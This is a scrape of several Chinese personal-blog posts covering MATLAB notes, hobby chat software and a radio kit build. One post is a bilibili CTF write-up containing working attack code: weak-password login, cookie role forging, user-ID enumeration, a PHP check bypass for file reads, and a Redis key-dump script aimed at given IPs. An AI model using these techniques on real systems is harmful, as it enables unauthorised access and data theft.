绘制由x=x(t),y=y(t)的参数方程 二元函数绘图 函数名 用法示例 描述 ezmesh() ezmesh(f,domain) f为函数名，domain表示取值范围 ezmesh(x,y,z,[smin,smax,tmin,tmax]) 由x，y，z表示的参数函数 回归模型 一元线性回归 函数名 用法示例 描述 regress() [b ,bint,r,rint,start] = regress(Y,X) 见下方实验的解析 1 2 3 4 5 6 x = -2:0.5:2; y = x.^2 + 2*x + 3; Y =[1.0000 0.2500 0 0.2500 1.0000 2.2500 4.0000 6.2500 9.0000]+2 [b ,bint,r,rint,start] = regress(Y\u0026#39;,[ones(size(y));x;x.^2]\u0026#39;); b polyval(fliplr(b\u0026#39;),x) 解析：\nB：回归系数，是个向量（“the vector B of regression coefficients in the linear model Y = X*B”）\nBINT：回归系数的区间估计（“a matrix BINT of 95% confidence intervals for B”）\nR：残差（ “a vector R of residuals”）\nRINT：置信区间（“a matrix RINT of intervals that can be used to diagnose outliers”）\nSTATS：用于检验回归模型的统计量。有4个数值：判定系数R^2，F统计量观测值，检验的p的值，误差方差的估计\nALPHA：显著性水平（缺少时为默认值0.05）\nY是一个由结果组成的列向量（如果不是列向量，需要转置）\nX是单因素x的所有次方（包括零次方，也就是全1向量，通常用ones(size(x))生成。）组成的矩阵的转置\n注意：\n回归系数B是个按x次方由小到大排列的列向量，使用polyval拟合结果时需要对B转置并左右交换，即polyval(fliplr(b\u0026rsquo;),x)\n多元线性回归 函数名 用法示例 描述 regress() 如下 如下 1 2 3 4 5 6 7 % 导入数据 y=[7613.51 7850.91 8381.86 9142.81 10813.6 8631.43 8124.94 9429.79 10230.81 10163.61 9737.56 8561.06 7781.82 7110.97]\u0026#39;; x1=[7666 7704 8148 8571 8679 7704 6471 5870 5289 3815 3335 2927 2758 2591]\u0026#39;; x2=[16.22 16.85 17.93 17.28 17.23 17 19 18.22 16.3 13.37 11.62 10.36 9.83 9.25]\u0026#39;; X=[ones(size(y)), x1.^2,x2.^2, x1, x2, x1.*x2]; % 开始分析 [b,bint,r,rint,stats] = regress(y,X); 一元非线性回归 函数名 用法示例 描述 inline() fun=inline(\u0026lsquo;函数\u0026rsquo;,\u0026lsquo;待定系数\u0026rsquo;,\u0026lsquo;变量\u0026rsquo;) 将fun定义为带有待定系数的内联函数 nlinfit() [beta,r,j]=nlinfit(x,y,fun,b0) x为自变量，y为因变量，fun为非线性回归的函数，b0是初始函数，beta为待定系数组成的向量，r为拟合残差，j为雅可比矩阵的数值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 x=[ 0,47,93,140,186,279,372,465,558,651]; y=[18.98,27.35,34.86,38.52,38.44,37.73,38.43,43.87,42.77,46.22]; plot(x,y,\u0026#39;*\u0026#39;) b0=[43,0.6,0.1]; %初始参数值 fun=inline(\u0026#39;b(1)*(1-b(2)*exp(-b(3)*x))\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;x\u0026#39;); [b,r,j]=nlinfit(x,y,fun,b0); b %最佳参数 R=sum(r.^2) %误差平方和 y1=42.6643*(1-0.5483*exp(-0.0099*x)); plot(x,y,\u0026#39;*\u0026#39;,x,y1,\u0026#39;-or\u0026#39;) 可决系数 可决系数是检验曲线拟合度的重要指标\n1 2 3 4 5 6 % 求可决系数R，求残差绝对值和W % r1为残差，x为原始数据 R1 = sum(r1.^2); R2 = sum((x-mean(x)).^2); R = 1-R1/R2\u0026#39; W = sum(abs(r1)) ","permalink":"https://www.papernote.cn/posts/2021-10-10-matlabnote/","summary":"基本 变量域与格式 清理工作区变量：clear、清理命令行窗口：clc。\n调整输出格式：\n1 format [style] 其中style有：\nstyle 描述 rat 以分数形式输出 compact 以紧凑型格式输出 short 以四位小数输出 long 输出较长的小数位 shortEng 以科学计数法输出较短小数 longEng 以科学计数法输出较长小数 hex 以 16 进制数输出 输入输出 函数名 用法示例 描述 disp() disp(String) 显示一段文字 fprintf() fprintf(formated string{,data}) 格式输出（字面意思） print() print(Target,data) 向Target展示data（不常用） 逻辑运算 判断语句：\n1 2 3 4 5 6 7 if (条件语句) 运算式 elseif (条件语句2) 运算式2 else 运算式3 end for 循环：\n1 2 3 4 5 6 7 8 for 变数 = 矩阵 运算式 end % 等差数列 for i = 1:6 disp(i) % 逐行输出 1 2 3 4 5 6 end while 循环：","title":"MATLAB 小笔记"},{"content":" 本记录由 TePuint Club 赞助完成，原始链接：GitHub\n❗ 注意\n如果你没有达到70分请不要往下查看\n活动地址：sec1024\n第一题 - 页面的背后是什么？ 打开DevTool审查元素，在\u0026lt;input\u0026gt;中找到data\n第二题 - 真正的秘密只有特殊的设备才能看到 修改浏览器的User-Agent为 bilibili Security Browser，然后刷新网页，就可以看到flag了。\n第三题 - 密码是啥？ 就是弱口令，完全靠猜，用户名 admin ，密码 bilibili 。\n或者直接在Console中输入：\n1 2 3 4 5 6 7 8 9 10 11 12 13 $.ajax({ url: \u0026#34;api/ctf/3\u0026#34;, type: \u0026#34;post\u0026#34;, contentType: \u0026#34;application/json\u0026#34;, dataType: \u0026#34;json\u0026#34;, data: JSON.stringify({ username: \u0026#34;admin\u0026#34;, passwd: \u0026#34;bilibili\u0026#34;, }), success: function (data) { console.log(data.data) } }) 第四题 - 对不起，权限不足～ cookies中 role 对应的值为user的MD5，所以将这个值改为 Administrator 的MD5，即 7b7bc2512ee1fedcd76bdc68926d4f7b ，然后刷新网页，就可以看到flag了。\n第五题 - 别人的秘密 使用Console向后穷举，我也不知道那个uid哪里来的。\n在Console中输入：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 get(100336889) //这里每个人有可能不一样，请在网页中查找 function get(uid) { $.ajax({ url: \u0026#34;api/ctf/5?uid=\u0026#34; + uid, type: \u0026#34;get\u0026#34;, success: function (data) { if (data.code == 200) { console.log(data.data) } else { get(uid + 1) } } }) } 第十题 - 结束亦是开始 你没看错，这里是第十题，但这一题的入口在第六题，也就是第六题做完是第十题的答案。\n注意：每个人的靶机不一定相同，请注意更换IP\n访问 http://120.92.151.189/blog/test.php （扫目录扫出来的） 将网页中所有的内容复制粘贴到Console中，获取str1和str2 1 2 3 var str1 = \u0026#34;\\u7a0b\\u5e8f\\u5458\\u6700\\u591a\\u7684\\u5730\\u65b9\u0026#34;; var str2 = \u0026#34;bilibili1024havefun\u0026#34;; console.log() 将str1进行Unicode转中文得到 程序员最多的地方 即 GitHub 在GitHub搜索str2,即\u0026quot;bilibili1024havefun\u0026quot; 在搜索结果中找到与end有关的那个 传送门 分析PHP文件,id为不含1的数组，路径不清楚要猜 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php //filename end.php $bilibili = \u0026#34;bilibili1024havefun\u0026#34;; $str = intval($_GET[\u0026#39;id\u0026#39;]); $reg = preg_match(\u0026#39;/\\d/is\u0026#39;, $_GET[\u0026#39;id\u0026#39;]); if (!is_numeric($_GET[\u0026#39;id\u0026#39;]) and $reg !== 1 and $str === 1) { $content = file_get_contents($_GET[\u0026#39;url\u0026#39;]); //文件路径猜解 if (false) { echo \u0026#34;还差一点点啦～\u0026#34;; } else { echo $flag; } } else { echo \u0026#34;你想要的不在这儿～\u0026#34;; } ?\u0026gt; 构造URL，使满足 !is_numeric($_GET['id']) and $reg !== 1 and $str === 1 猜URL，访问 http://120.92.151.189/blog/end.php?id[]=\u0026amp;url=./flag.txt 得到一张图片 图片另存为，并用npp或者记事本打开,就可以在文件末尾找到flag 第八题 - Redis 在做本题时可能会遇到redis连接不上的问题，我们使用Python脚本进行轰炸\n首先安装redis库：!pip3 install redis\n接着执行以下Python脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import redis serve = \u0026#39;45.113.201.36\u0026#39; #设置服务器IP地址 print(\u0026#39;Connecting the Server (\u0026#39;+serve+\u0026#39;) ...\u0026#39;) while True: try: r = redis.StrictRedis(host=serve, port=6379) keys = r.keys() print(\u0026#39;We got the flag:\u0026#39;) for key in keys: value = r.get(key) print(key, value) break except: print(\u0026#39;Error: Connection timed out\u0026#39;) pass ","permalink":"https://www.papernote.cn/posts/2020-10-25-bilibili-sec1024/","summary":"本记录由 TePuint Club 赞助完成，原始链接：GitHub\n❗ 注意\n如果你没有达到70分请不要往下查看\n活动地址：sec1024\n第一题 - 页面的背后是什么？ 打开DevTool审查元素，在\u0026lt;input\u0026gt;中找到data\n第二题 - 真正的秘密只有特殊的设备才能看到 修改浏览器的User-Agent为 bilibili Security Browser，然后刷新网页，就可以看到flag了。\n第三题 - 密码是啥？ 就是弱口令，完全靠猜，用户名 admin ，密码 bilibili 。\n或者直接在Console中输入：\n1 2 3 4 5 6 7 8 9 10 11 12 13 $.ajax({ url: \u0026#34;api/ctf/3\u0026#34;, type: \u0026#34;post\u0026#34;, contentType: \u0026#34;application/json\u0026#34;, dataType: \u0026#34;json\u0026#34;, data: JSON.stringify({ username: \u0026#34;admin\u0026#34;, passwd: \u0026#34;bilibili\u0026#34;, }), success: function (data) { console.log(data.data) } }) 第四题 - 对不起，权限不足～ cookies中 role 对应的值为user的MD5，所以将这个值改为 Administrator 的MD5，即 7b7bc2512ee1fedcd76bdc68926d4f7b ，然后刷新网页，就可以看到flag了。","title":"2020-bilibili-sec1024"},{"content":" ❗ 警告\n由于小站于近期更新，导致部分或全部功能无法使用，将会陆续恢复，特此告知。\n前言 刚创建网站时，我看着我选择的首页大图，如果一成不变，那固然会让人索然乏味，于是我打算随机的获取一张美图。一开始，我瞄上了必应日图，但是苦于没有制作API方面的知识，只能单纯的下载一张图片放上去，久而久之甚是疲惫。后来我在网上也找到一些相关的API，但是它们的访问速度都太慢，小蒋（没错，又是他）就推荐我来到了图鉴的开发组，经过我的了解，他们并没有可以直接获取随机图片的API，我又需要使用他们的接口二次开发，于是这个项目又不了了之。\n今年夏天，我自学了一点C#，参与到了图鉴的开发当中，制作了一个还不错的桌面版图鉴的内核，也了解到了不少API调用方面的知识。于是，我便打算重新开始这个项目。\n关于图鉴 图鉴日图（Dailypics）是一个人工精选日图的壁纸软件。每天清晨，从用户上传图片中选出两张作为今日日图，小而不杂。\n在酷安上查看： API文档 随机选图 GET https://papernote.cn/dpic/random.php\nArgs:\ntype : *图片类型 \u0026ldquo;pc/mobile\u0026rdquo; raw : *是否以代理方式返回图片，false时会返回一个301 type参数可以指定“pc”或者“mobile”来输出适合指定设备浏览的图片，当不指定或者选择了错误的选项，则返回完全随机的图片。\nraw选项决定返回的是重定向还是图片，当raw=true时，则返回一张图片，反之，则重定向到图鉴的图床服务器，该参数默认为false。\n调用示例：\nhttps://papernote.cn/dpic/random.php?type=pc\u0026amp;raw=true https://papernote.cn/dpic/random.php?type=mobile\u0026amp;raw=true https://papernote.cn/dpic/random.php?type=pc https://papernote.cn/dpic/random.php?raw=true https://papernote.cn/dpic/random.php 搜索图片 ❗ 注意\n最近CDN有些抽风，有些样式炸了，呜呜呜。\n搜索图片的话我直接制作了一个网页版，图鉴自带的API我就不放出来了。传送门（API）\n（话说官网的搜索什么时候更新啊喂）\n没事没事，自己写个假的压压惊。\n根据PID获取指定图片（高级功能，需有能力获取PID） 这目前是我个人拿来做图床的功能，以后会在搜索图片中添加图片的详细信息。\n来自未来的Ayala：这个做了，但是效果不好于是没拿出来\n注意事项 接口调用\n1M的小水管，如果实在嫌太慢，就不要打开raw开关了亲。如果因为跨域（无论是本域名还是图床域名）而无法访问，请在评论区联系我，我将在第一时间解决。\n图源免责\n图片来自图鉴用户的投稿，与图鉴(Dailypics)和本站(papernote.cn)无关，若用户的行为侵犯了著作权人的合法权利，请联系：Chimon@Chimon.me，我们将第一时间解决。\n为爱发电\n图鉴的制作人也挺辛苦的，欢迎你们为Createlite发电！\n","permalink":"https://www.papernote.cn/posts/2020-09-01-%E5%9B%BE%E9%89%B4%E6%97%A5%E5%9B%BE-%E6%88%91%E5%88%B6%E4%BD%9C%E4%BA%86%E4%B8%80%E4%BA%9B%E6%96%B9%E4%BE%BFweb%E4%BD%BF%E7%94%A8%E7%9A%84api/","summary":"❗ 警告\n由于小站于近期更新，导致部分或全部功能无法使用，将会陆续恢复，特此告知。\n前言 刚创建网站时，我看着我选择的首页大图，如果一成不变，那固然会让人索然乏味，于是我打算随机的获取一张美图。一开始，我瞄上了必应日图，但是苦于没有制作API方面的知识，只能单纯的下载一张图片放上去，久而久之甚是疲惫。后来我在网上也找到一些相关的API，但是它们的访问速度都太慢，小蒋（没错，又是他）就推荐我来到了图鉴的开发组，经过我的了解，他们并没有可以直接获取随机图片的API，我又需要使用他们的接口二次开发，于是这个项目又不了了之。\n今年夏天，我自学了一点C#，参与到了图鉴的开发当中，制作了一个还不错的桌面版图鉴的内核，也了解到了不少API调用方面的知识。于是，我便打算重新开始这个项目。\n关于图鉴 图鉴日图（Dailypics）是一个人工精选日图的壁纸软件。每天清晨，从用户上传图片中选出两张作为今日日图，小而不杂。\n在酷安上查看： API文档 随机选图 GET https://papernote.cn/dpic/random.php\nArgs:\ntype : *图片类型 \u0026ldquo;pc/mobile\u0026rdquo; raw : *是否以代理方式返回图片，false时会返回一个301 type参数可以指定“pc”或者“mobile”来输出适合指定设备浏览的图片，当不指定或者选择了错误的选项，则返回完全随机的图片。\nraw选项决定返回的是重定向还是图片，当raw=true时，则返回一张图片，反之，则重定向到图鉴的图床服务器，该参数默认为false。\n调用示例：\nhttps://papernote.cn/dpic/random.php?type=pc\u0026amp;raw=true https://papernote.cn/dpic/random.php?type=mobile\u0026amp;raw=true https://papernote.cn/dpic/random.php?type=pc https://papernote.cn/dpic/random.php?raw=true https://papernote.cn/dpic/random.php 搜索图片 ❗ 注意\n最近CDN有些抽风，有些样式炸了，呜呜呜。\n搜索图片的话我直接制作了一个网页版，图鉴自带的API我就不放出来了。传送门（API）\n（话说官网的搜索什么时候更新啊喂）\n没事没事，自己写个假的压压惊。\n根据PID获取指定图片（高级功能，需有能力获取PID） 这目前是我个人拿来做图床的功能，以后会在搜索图片中添加图片的详细信息。\n来自未来的Ayala：这个做了，但是效果不好于是没拿出来\n注意事项 接口调用\n1M的小水管，如果实在嫌太慢，就不要打开raw开关了亲。如果因为跨域（无论是本域名还是图床域名）而无法访问，请在评论区联系我，我将在第一时间解决。\n图源免责\n图片来自图鉴用户的投稿，与图鉴(Dailypics)和本站(papernote.cn)无关，若用户的行为侵犯了著作权人的合法权利，请联系：Chimon@Chimon.me，我们将第一时间解决。\n为爱发电\n图鉴的制作人也挺辛苦的，欢迎你们为Createlite发电！","title":"图鉴日图 - 我制作了一些(一个)方便web使用的API"},{"content":" ❗ 警告\n由于小站于近期更新，导致部分或全部功能无法使用，将会陆续恢复，特此告知。\n前传： 点击这里，查看首发帖。\n2018-08-14 21:20 NowChat Batch Edition正式在百度bat吧公布 2018-08-14 21:31 与吴先森交涉，决定使用自己的服务器 2018-08-14 21:37 用户登陆的种种设想均已完备 2018-08-14 21:53 决定使用GardensKernel进行聊天室开发 2018-08-15 12:02 登陆部分完成 2018-08-15 18:15 对所有的错误指定了错误页 2018-08-15 18:22 更新了账号生成的规则，添加了密码保护 2018-08-18 23:45 完成公共聊天室 某年月日 GK开发到可以使用，准备让NowChat接轨 某年月日 NowChat接轨完成，拥有较完美的GUI 某年月日 为NowChat开发了一些GK专有模块 某年月日 我的硬盘第一次炸 某年月日 我开学了 某年月日 2020年寒假，我重装了系统，但GK和NC开始鸽了 某年月日 我的系统又一次炸，当天重装系统后心血来潮更新NC，但是排版爆炸 2020-02-15 我通过Magic方法找到了Goeasy，正式开始了NC web的开发 2020-02-17 NowChat Web Edition第一个预览版开发完成 正文： CMD版NowChat为什么弃坑？ 这是最后一个CMD版本的NowChat，因为高三的缘故鸽了半年，在之前的帖子中rain提到，我正在开发其他东西，而这“东西”，正是“Gardens Kernel”（以下简称 GK），开发GK的初衷是简化复杂bat项目的构建，而GK正拥有这些特性：\n标准ini的读取 众多的模块（包括对第三方的调用） 完整的外部调用能力（调用里面的模块，并且返回） 好用的Debug系统 windows平台统一化 随着GK开发进度的推进，终于迎来了在TE内部的测试，但是测试结果不太理想，三个演示demo中最重要的那个出现了问题，而这问题只有在我的电脑上才正常，测试结果表明，在我的CMD中，没有字符间距，而其他人那里均出现夸张的排版问题，于是GK的开发便告一段落（其实是我自愧不如山归山的“batchhander”）。\n后来在我某次重装系统过后，我再一次打开了NowChat，排版问题出现了：\n这可能是导致NowChat工程项目再一次搁浅的间接原因，还有一部分原因是因为学业繁忙。\nWEB版NowChat，NC的春天？ 不过没想到今年的寒假会那么的长，于是我便开发了NowChat的WEB版，不过这个WEB版只经历了三天左右的开发周期，经由TE和init的内部测试，尚且有许多bug（比如说网页劫持啊，登陆故障啊，移动设备兼容啊等等）。\n开发过程中，我依然采用MDUI作为网页框架 ,而网络部分使用了基于WebSocket的Goeasy(话说回来，Goeasy开发聊天室是真的方便！)，至于排版，emmmmm……不喜勿喷！我最终的目标是在小屏设备上，这个聊天室可以撑满整个页面，目前宽度已做了响应式，但是影响原先排版，高度打算让js来，但如果MDUI有原生解决方案就最好了。\n基于HTML5重做的NowChat具有以下优势：\n多达60个用户的并发网络（Goeasy免费版） 信息传播达到毫秒级 响应式 图片中的Demo网址可以直接访问，如果有问题，欢迎在评论区反馈，此项目开源（MIT协议），GitHub仓库访问地址：\nhttps://github.com/AyalaKaguya/NowChat\n小站官方聊天室地址：NowChat\n","permalink":"https://www.papernote.cn/posts/2020-02-22-%E4%BB%8Ebatch%E5%88%B0javascriptnowchat%E7%9A%84%E8%84%B1%E8%83%8E%E6%8D%A2%E9%AA%A8%E4%B9%8B%E8%B7%AF/","summary":"❗ 警告\n由于小站于近期更新，导致部分或全部功能无法使用，将会陆续恢复，特此告知。\n前传： 点击这里，查看首发帖。\n2018-08-14 21:20 NowChat Batch Edition正式在百度bat吧公布 2018-08-14 21:31 与吴先森交涉，决定使用自己的服务器 2018-08-14 21:37 用户登陆的种种设想均已完备 2018-08-14 21:53 决定使用GardensKernel进行聊天室开发 2018-08-15 12:02 登陆部分完成 2018-08-15 18:15 对所有的错误指定了错误页 2018-08-15 18:22 更新了账号生成的规则，添加了密码保护 2018-08-18 23:45 完成公共聊天室 某年月日 GK开发到可以使用，准备让NowChat接轨 某年月日 NowChat接轨完成，拥有较完美的GUI 某年月日 为NowChat开发了一些GK专有模块 某年月日 我的硬盘第一次炸 某年月日 我开学了 某年月日 2020年寒假，我重装了系统，但GK和NC开始鸽了 某年月日 我的系统又一次炸，当天重装系统后心血来潮更新NC，但是排版爆炸 2020-02-15 我通过Magic方法找到了Goeasy，正式开始了NC web的开发 2020-02-17 NowChat Web Edition第一个预览版开发完成 正文： CMD版NowChat为什么弃坑？ 这是最后一个CMD版本的NowChat，因为高三的缘故鸽了半年，在之前的帖子中rain提到，我正在开发其他东西，而这“东西”，正是“Gardens Kernel”（以下简称 GK），开发GK的初衷是简化复杂bat项目的构建，而GK正拥有这些特性：\n标准ini的读取 众多的模块（包括对第三方的调用） 完整的外部调用能力（调用里面的模块，并且返回） 好用的Debug系统 windows平台统一化 随着GK开发进度的推进，终于迎来了在TE内部的测试，但是测试结果不太理想，三个演示demo中最重要的那个出现了问题，而这问题只有在我的电脑上才正常，测试结果表明，在我的CMD中，没有字符间距，而其他人那里均出现夸张的排版问题，于是GK的开发便告一段落（其实是我自愧不如山归山的“batchhander”）。\n后来在我某次重装系统过后，我再一次打开了NowChat，排版问题出现了：\n这可能是导致NowChat工程项目再一次搁浅的间接原因，还有一部分原因是因为学业繁忙。\nWEB版NowChat，NC的春天？ 不过没想到今年的寒假会那么的长，于是我便开发了NowChat的WEB版，不过这个WEB版只经历了三天左右的开发周期，经由TE和init的内部测试，尚且有许多bug（比如说网页劫持啊，登陆故障啊，移动设备兼容啊等等）。\n开发过程中，我依然采用MDUI作为网页框架 ,而网络部分使用了基于WebSocket的Goeasy(话说回来，Goeasy开发聊天室是真的方便！)，至于排版，emmmmm……不喜勿喷！我最终的目标是在小屏设备上，这个聊天室可以撑满整个页面，目前宽度已做了响应式，但是影响原先排版，高度打算让js来，但如果MDUI有原生解决方案就最好了。","title":"从Batch到JAVA Script，NowChat的脱胎换骨之路！"},{"content":" 什么是SMB协议？ 这个协议的内容十分的繁冗复杂，具有非常多样化的功能，其作用和原理我就不在这里赘述了，尽管SMBchat只用到其中的星星点点，但配置过程还是很长，我会尽量的将SMBchat的部署和使用过程简化，并放在这篇文章中。\nSMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。\nSMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。\nSMB使用了NetBIOS的应用程序接口 （Application Program Interface，简称API），一般端口使用为139，445。\n另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有65个最上层的作业，而每个作业都超过120个函数，甚至Windows NT也没有全部支持到。\n最近微软又把 SMB 改名为 CIFS（CommonInternet File System），并且加入了许多新的特色。\nSMB-百度百科\nSMBchat的由来 Paper的小故事时间（雾）\n时间推至怀仁18年的新高一，两个新人正对着FTP指指点点。\n“你配置FTP的速度还能再快点吗？”刚下课的小王失落的对小明说。\n“三分半，不能再少了。”\n“可是每次我都觉得，这已经半节课过去了。”\n片段一 一个星期过去了，又是那节信息技术课。\n“你这FTP服务端不行啊！”刚刚掉线的小明对小王说。\n“已经可以在一分钟之内开启共享了，还有什么不足的吗？”\n“老是要掉线，传输速度也慢，莫名其妙会弹出用户无法登录。”\n“那你有更好的解决办法吗？”疑惑的小王对小明说。\n“SMB共享文件吧，虽然我不知道怎么用。”\n片段二 又是一个星期过去了，但不是那节信息课\n“这SMB共享有点强啊！”\n“怎么了？”\n“根据我的使用情况来看，速度快，稳定性强，但是，最重要的是可以直接编辑上面的文件！”\n“正常。”\n“我感觉我可以写个聊天软件”\n片段三 谁也不知道为啥要在学校上信息技术课的时候共享文件。\n好吧，话不多说，其实就是为了能在课上可以联系到彼此还有玩游戏才搞的这么一个共享，我记得当时我们是在目录中通过修改文件名的办法来进行交谈的，在以后的几节课中，我利用闲暇时光，制作了这么一个软件的早期版本。\n然后一直到了高二，我与小明不再是一个班了，但是我又认识了一位有点底子的人，于是，我又重新开始了SMBchat的制作，并推广到了全班（老师：MMP），最终有了现在这么一个版本。\nSMBchat使用效果 传统的UI界面\n分离式UI界面\n功能丰富的菜单\n使用SMBchat前需注意的事项 系统：Windows 2000 ~ Windows 10 （在更新的版本中，对系统的支持将从Windows 7开始）\n内存：最低256MB\n硬盘空间：最低1MB\n网络：需要开放443端口，并拥有IP地址\n其他：需知道主机的名称\n❗ 警告！\n受最近永恒之蓝等病毒的影响，部分运营商已关闭外网的445端口，您无法使用SMBchat在外网交谈，但一定程度上保护了你的电脑免受这类病毒的侵扰，尽管如此，当你不使用SMBchat时，请尽量确保你的445端口在不使用SMB时不是打开状态\n下载SMBchat 目前只提供了GitHub的下载方式，点击下面的链接，即可访问SMBchat的库。\nhttps://github.com/AyalaKaguya/SMBchat\n如何配置SMBchat 这么多好处又该如何使用呢？\n服务器 在这里，我们将以win10为例，配置SMBchat，如果其他系统（比如Windows 7以及Windows XP）中没有对应的属性设置，您可以直接跳过，这对于你的系统不是必须的。（在Windows vista之后需要配置用户权限，而之前的大部分桌面版本并不需要。）\n首先我们需要在作为服务器的电脑上建立一个文件夹，为了方便查找，我将其取名为“SMB”\n然后我们右键这个文件夹，点击“属性”。\n然后切换到“共享”选项卡，您会发现：\n我们点开“高级共享”（需要管理员权限）\n然后在弹出的窗口中：\n然后连续点击两个确定，返回“SMB 属性”，然后我们点击下面的“网络和共享中心”\n然后，我们就可以保存更改了。接着，我们进入“安全” 选项卡 ：\n然后点确定，自此，我们就配置完成了。\n❗ 再次警告！\n在你不使用SMBchat时，请不要把你的文件夹共享打开！\n如何获得服务器地址？ 首先，我们退回桌面。\n如果我们的计算机名是“DESKTOP-PAPERMO”，那么我们的聊天服务器地址就应该是“\\DESKTOP-PAPERMO\\SMB”，即“\\你的计算机名\\你设置的文件夹名”\n会玩的朋友可以在文件资源管理器里打开这个地址，来体验SMB共享文件的便捷。\n客户端 打开SMBchat，我们即将试验上面开服务器得到的地址“ \\DESKTOP-PAPERMO\\SMB ”\n然后按下Enter，我们就可以享受SMBchat了！\nSMBchat的指令表 在成功登录服务器后的任何时候，你可以使用以下指令来优化你的聊天环境。\n命令名 作用 /logout 退出登录，并切换下一个用户 /win 启用分离式窗口，但无法使用部分功能 /host 跟换新的聊天服务器地址 /reset 重置当前的SMBchat副本 /help 显示帮助文档 /exit 退出SMBchat，并向其他人广播 /cls 清空当前会话，并保存 /history 调用已经归档的内容 /del 删除归档的内容 一些更新 尽管SMBchat已经更新完善，但是仍然存在着许多的问题，欢迎你提出改进的意见和建议，我会在以后的日程中尽力对其进行修补的。\n在文章的图片中有小伙伴可能就发现了，“哎，纸莫你的语文没学好吧！”，但其实则不然，这些语言文字的错误早在2018年的暑假里我就已经更正了，至于为什么图片中存在错误，是因为我在写这篇文章时用了一个老版本，这下误解因该解开了吧（满头大汗）。\n当遇到故障时 当遇到故障时，比如SMBchat抽风，或者无法访问某台服务器，请不要惊慌，这里提供了一些排查的措施：\n是否您的SMB权限已经给足？ 是否您的程序没用管理员权限打开？ 您SMB共享的位置是不是磁盘根目录？ 您是否关掉了密码保护共享？ 您是否输入了正确的地址 如果程序抽风，您可以删除同目录下的sti.bat来解决这一问题\n","permalink":"https://www.papernote.cn/posts/2019-08-04-smbchat-%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8Esmb%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6/","summary":"什么是SMB协议？ 这个协议的内容十分的繁冗复杂，具有非常多样化的功能，其作用和原理我就不在这里赘述了，尽管SMBchat只用到其中的星星点点，但配置过程还是很长，我会尽量的将SMBchat的部署和使用过程简化，并放在这篇文章中。\nSMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。\nSMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。\nSMB使用了NetBIOS的应用程序接口 （Application Program Interface，简称API），一般端口使用为139，445。\n另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有65个最上层的作业，而每个作业都超过120个函数，甚至Windows NT也没有全部支持到。\n最近微软又把 SMB 改名为 CIFS（CommonInternet File System），并且加入了许多新的特色。\nSMB-百度百科\nSMBchat的由来 Paper的小故事时间（雾）\n时间推至怀仁18年的新高一，两个新人正对着FTP指指点点。\n“你配置FTP的速度还能再快点吗？”刚下课的小王失落的对小明说。\n“三分半，不能再少了。”\n“可是每次我都觉得，这已经半节课过去了。”\n片段一 一个星期过去了，又是那节信息技术课。\n“你这FTP服务端不行啊！”刚刚掉线的小明对小王说。\n“已经可以在一分钟之内开启共享了，还有什么不足的吗？”\n“老是要掉线，传输速度也慢，莫名其妙会弹出用户无法登录。”\n“那你有更好的解决办法吗？”疑惑的小王对小明说。\n“SMB共享文件吧，虽然我不知道怎么用。”\n片段二 又是一个星期过去了，但不是那节信息课\n“这SMB共享有点强啊！”\n“怎么了？”\n“根据我的使用情况来看，速度快，稳定性强，但是，最重要的是可以直接编辑上面的文件！”\n“正常。”\n“我感觉我可以写个聊天软件”\n片段三 谁也不知道为啥要在学校上信息技术课的时候共享文件。\n好吧，话不多说，其实就是为了能在课上可以联系到彼此还有玩游戏才搞的这么一个共享，我记得当时我们是在目录中通过修改文件名的办法来进行交谈的，在以后的几节课中，我利用闲暇时光，制作了这么一个软件的早期版本。\n然后一直到了高二，我与小明不再是一个班了，但是我又认识了一位有点底子的人，于是，我又重新开始了SMBchat的制作，并推广到了全班（老师：MMP），最终有了现在这么一个版本。\nSMBchat使用效果 传统的UI界面\n分离式UI界面\n功能丰富的菜单\n使用SMBchat前需注意的事项 系统：Windows 2000 ~ Windows 10 （在更新的版本中，对系统的支持将从Windows 7开始）\n内存：最低256MB\n硬盘空间：最低1MB\n网络：需要开放443端口，并拥有IP地址\n其他：需知道主机的名称\n❗ 警告！\n受最近永恒之蓝等病毒的影响，部分运营商已关闭外网的445端口，您无法使用SMBchat在外网交谈，但一定程度上保护了你的电脑免受这类病毒的侵扰，尽管如此，当你不使用SMBchat时，请尽量确保你的445端口在不使用SMB时不是打开状态\n下载SMBchat 目前只提供了GitHub的下载方式，点击下面的链接，即可访问SMBchat的库。\nhttps://github.com/AyalaKaguya/SMBchat","title":"SMBchat-一个基于SMB协议的聊天软件"},{"content":"开箱！ 收到了快递，立马将快递盒大卸八块。\n一个简陋的塑封袋\n所有组件一览\n亚克力板材质的外壳\n准备工作 家境贫寒，真的\n纸莫的工作台（简陋）\n为电阻排序\n为电容排序\n一些其他的零部件\n焊接过程 烙铁真烫手\n先将电阻安装进孔\n电阻焊接完成\n然后将瓷片电容？安装进孔\n一些其他的东西\n处理三极管的针脚\n将三极管安装到位\n全桥整流器！！！\n安装一些大的组件的照片找不到了还行。。。\n但是我记得，那个电感有多恶心！\n安装完成！\n塞进外壳\n电台测评（雾） 我所制作的是来自某宝的神奇科技，工作频率7023KHz，听说网上一些火腿用这个成功联通浙江和沈阳，但是我觉得这个收发报机并没太大实用价值，灵敏度低，收发不能同频 ，关键是天线很长 ，就算是使用1:4的巴轮，天线的总长度也要达到20.25M（我家屋顶放不下），所以现阶段我无法对这台设备进行调试，更别提测评了????。\n我以后尽量补齐????。\n一些文献 以下内容来自互联网，如有侵权，请联系我删除\n1、简介\n皮鞋是一个体积非常小巧的简易 40米波段微功率等幅电报收发信机，使用 